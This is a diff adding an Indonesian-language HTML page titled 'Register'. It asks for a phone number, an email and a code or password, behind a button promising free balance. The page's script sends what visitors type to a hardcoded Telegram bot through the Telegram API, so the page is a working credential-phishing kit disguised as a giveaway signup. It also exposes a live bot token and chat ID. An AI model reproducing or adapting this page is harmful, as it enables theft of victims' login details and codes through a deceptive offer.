@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: rgb(0, 187, 255);
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            width: 300px;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        button{
+            background-color: rgb(0, 187, 255);
+            border: none;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="./logo.png" alt="logo" width="100">
+        <input type="text" id="name" placeholder="No handphone" required>
+        <input type="email" id="email" placeholder="Email" required>
+        <input type="password" id="password" placeholder="Kode" required>
+        <button onclick="sendToTelegram()">Dapatkan saldo gratis</button>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            const botToken = "8121391946:AAH4HAiB0XngOLBuCxyBDslomB5G3_OrKOs";
+            const chatId = "5562048470";
+            const name = document.getElementById("name").value;
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            
+            if (!name || !email || !password) {
+                alert("Harap isi semua data!");
+                return;
+            }
+            
+            const message = `Pendaftaran Baru:\nNama: ${name}\nEmail: ${email}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Data berhasil dikirim ke Telegram!");
+                    } else {
+                        alert("Gagal mengirim data.");
+                    }
+                })
+                .catch(error => alert("Terjadi kesalahan!"));
+        }
+    </script>
+</body>
+</html>
